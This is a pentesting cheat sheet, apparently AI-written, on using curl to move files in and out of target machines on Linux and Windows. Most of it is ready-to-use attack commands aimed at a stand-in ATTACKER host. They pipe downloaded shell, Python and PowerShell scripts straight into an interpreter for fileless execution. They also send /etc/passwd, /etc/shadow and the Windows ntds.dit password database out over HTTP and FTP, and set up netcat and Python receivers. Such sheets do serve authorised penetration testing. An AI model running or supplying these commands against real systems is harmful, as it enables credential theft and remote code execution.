# cURL

**Tags:** `#curl` `#filetransfer` `#download` `#upload` `#exfil` `#linux` `#windows` `#fileless`

Swiss army knife for HTTP/FTP/SMB transfers. Available on both Linux and Windows (Windows 10+ built-in). In pentesting: download tools onto targets, upload/exfil files, interact with APIs, and execute payloads in-memory without touching disk. More flexible than wget — supports PUT/POST uploads, custom headers, and multiple protocols natively.

**Source:** Pre-installed on Kali and Windows 10+

```bash
# Download file
curl http://ATTACKER/tool -o /tmp/tool

# Download and execute without writing to disk
curl http://ATTACKER/shell.sh | bash
```

---

## Download

```bash
# Download and save (keep remote filename)
curl -O http://ATTACKER/tool.sh

# Download and save with custom name
curl http://ATTACKER/tool.sh -o /tmp/mytool.sh

# Silent (no progress bar)
curl -s http://ATTACKER/tool -o /tmp/tool

# Follow redirects
curl -L http://ATTACKER/tool -o /tmp/tool

# Skip SSL verification
curl -k https://ATTACKER/tool -o /tmp/tool

# Resume download
curl -C - http://ATTACKER/largefile -o /tmp/largefile
```

---

## In-Memory / Fileless Execution

```bash
# Execute bash script without writing to disk
curl -s http://ATTACKER/shell.sh | bash

# Execute Python
curl -s http://ATTACKER/exploit.py | python3

# Execute PowerShell (Windows)
curl http://ATTACKER/shell.ps1 | powershell -

# IEX equivalent via curl (Windows)
powershell -c "IEX(curl http://ATTACKER/shell.ps1 -UseBasicParsing)"
```

---

## Upload / Exfiltration

```bash
# Upload file via POST (multipart form)
curl -X POST http://ATTACKER:8000/upload -F "file=@/etc/passwd"

# Upload via PUT
curl -X PUT http://ATTACKER:8000/upload -d @/etc/shadow

# Base64-encode and POST (exfil binary-safe)
curl -s -X POST http://ATTACKER:8000/recv \
  --data-urlencode "data=$(cat /etc/passwd | base64)"

# Exfil via URL parameter (small files)
curl "http://ATTACKER:8000/recv?data=$(cat /etc/passwd | base64 | tr -d '\n')"

# Upload to FTP
curl ftp://user:pass@ATTACKER/upload/ -T /tmp/sensitive.txt

# Upload via SMB (Windows — requires net use or direct UNC path)
# Use impacket-smbserver instead
```

**Kali receiver for file exfil:**
```bash
# netcat receiver
nc -lvnp 9001 > received.txt
# Target: curl http://ATTACKER:9001 --data-binary @/etc/passwd

# Python upload receiver (handles multipart POST)
python3 -c "
import http.server, cgi, os
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        form = cgi.FieldStorage(fp=self.rfile, headers=self.headers,
            environ={'REQUEST_METHOD':'POST','CONTENT_TYPE':self.headers['Content-Type']})
        f = form['file']
        open(f.filename, 'wb').write(f.file.read())
        self.send_response(200); self.end_headers()
http.server.HTTPServer(('',8000),H).serve_forever()
"
```

---

## Authentication

```bash
# HTTP Basic auth
curl -u admin:Password http://target.com/protected/file -o file

# Cookie
curl -b "session=abc123" http://target.com/protected/file -o file

# Bearer token
curl -H "Authorization: Bearer TOKEN" http://api.target.com/file -o file

# Custom header
curl -H "X-API-Key: abc123" http://api.target.com/file -o file
```

---

## Proxy / Pivot

```bash
# HTTP proxy (Burp)
curl -x http://127.0.0.1:8080 http://target.com/file -o file

# SOCKS5
curl --socks5 127.0.0.1:1080 http://target.com/file -o file

# Proxychains
proxychains curl http://ATTACKER/tool -o /tmp/tool
```

---

## Windows Usage

curl is built into Windows 10+ (`C:\Windows\System32\curl.exe`):

```cmd
:: Download tool
curl http://ATTACKER/tool.exe -o C:\Windows\Temp\tool.exe

:: Silent download
curl -s http://ATTACKER/tool.exe -o C:\Windows\Temp\tool.exe

:: Skip SSL
curl -k https://ATTACKER/tool.exe -o C:\Windows\Temp\tool.exe

:: Upload file (exfil)
curl -X POST http://ATTACKER:8000/recv -F "file=@C:\Windows\NTDS\ntds.dit"
```

---

## API Interaction

```bash
# GET with JSON response
curl -s http://target.com/api/users | python3 -m json.tool

# POST JSON
curl -s -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'

# PUT
curl -X PUT http://target.com/api/user/1 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

# DELETE
curl -X DELETE http://target.com/api/user/99

# Save cookies to file and reuse
curl -c cookies.txt -X POST http://target.com/login -d "user=admin&pass=admin"
curl -b cookies.txt http://target.com/dashboard
```

---

## Useful Flags

| Flag | Description |
|---|---|
| `-o <file>` | Output to file |
| `-O` | Output to file using remote filename |
| `-s` | Silent (no progress/errors) |
| `-v` | Verbose (show headers) |
| `-L` | Follow redirects |
| `-k` | Skip SSL verification |
| `-C -` | Resume download |
| `-x <proxy>` | HTTP proxy |
| `-u user:pass` | Basic auth |
| `-H "Header: val"` | Custom header |
| `-b "cookie"` | Send cookie |
| `-c <file>` | Save cookies to file |
| `-d <data>` | POST body data |
| `-F "field=@file"` | Multipart form upload |
| `-X <method>` | HTTP method |
| `--data-binary` | POST binary data |

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
